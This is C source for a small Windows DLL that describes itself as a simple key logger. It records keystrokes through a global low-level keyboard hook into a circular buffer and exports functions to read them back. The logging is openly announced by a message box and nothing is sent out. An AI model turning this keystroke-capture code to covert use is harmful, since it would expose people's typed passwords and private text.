/**
 * Pretty simple and dumb key logger.
 *
 * Store logged keys into a circular buffer... for now, ignoring issues that may
 * arise from multi-threading.
 */
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <stdint.h>

/** I was going to declare a setter, which could be used to set this... but
 * whatever... */
static HHOOK _globalKeyHook = 0;

/** Mask that limits the number of keys. The array should actually be this value
 * increased by one.
 * The current value uses 64KB for the array, enough to store 1 press per
 * millisecond, if checking 30 times per second (i.e., way more than enough). */
#define MAX_KEYS_MASK 0x7FF

/** Stores vkCode and flags for key events. vkCode spawn the lower 8 bits and
 * flags store the higher 8 bits */
static uint16_t keys[MAX_KEYS_MASK+1];
/** Position where new data may be written to */
static uint16_t head = 0;
/** Position where data may be read from */
static uint16_t tail = 0;

/**
 * Required so 'GetProcAddress' works on the caller.
 */
BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {
    return TRUE;
}

/**
 * Log key events from a LowLevelKeyboardProc hook procedure.
 *
 * For more info (and parameters description), see:
 *   https://msdn.microsoft.com/en-US/library/windows/desktop/ms644985(v=vs.85).aspx
 *   https://msdn.microsoft.com/en-US/library/windows/desktop/ms644967(v=vs.85).aspx
 */
__declspec(dllexport) LRESULT __stdcall keyCallback(int nCode
        , WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;

    /* Bits 1 and 4 specifies that it was injected */
    if ((pKey->flags & 0x12) == 0) {
        keys[head] = (pKey->vkCode & 0xFF) | ((pKey->flags & 0xFF) << 8);
        head++;
        head &= MAX_KEYS_MASK;
        /* I'm unsure about this, but whatever... If head loops and hits tail,
         * remove the oldest entry. */
        if (head == tail) {
            tail++;
            tail &= MAX_KEYS_MASK;
        }
    }

    return  CallNextHookEx(_globalKeyHook, nCode, wParam, lParam);
}

/**
 * Removes the last entry from the ciclic buffer (if any). If there's no entry,
 * return a fake "injected" key event instead.
 *
 * return The key event (vkCode on lower 8 bits, flags on higher 8)
 */
__declspec(dllexport) uint16_t __stdcall pop(void) {
    if (head != tail) {
        uint16_t ret = keys[tail];
        tail++;
        tail &= MAX_KEYS_MASK;
        return ret;
    }
    /* Abuse the fact that injected keys aren't logged and simply return a
     * fake-injected key. */
    return 0x12;
}

/**
 * Opens up a window and blocks until it gets closed. This can be used to keep
 * a valid context for logging alive.
 */
__declspec(dllexport) void __stdcall wait(void) {
    MessageBoxA(NULL, "Don't mind me, I'm logging stuff...", "Suppa logga~", MB_OK);
}
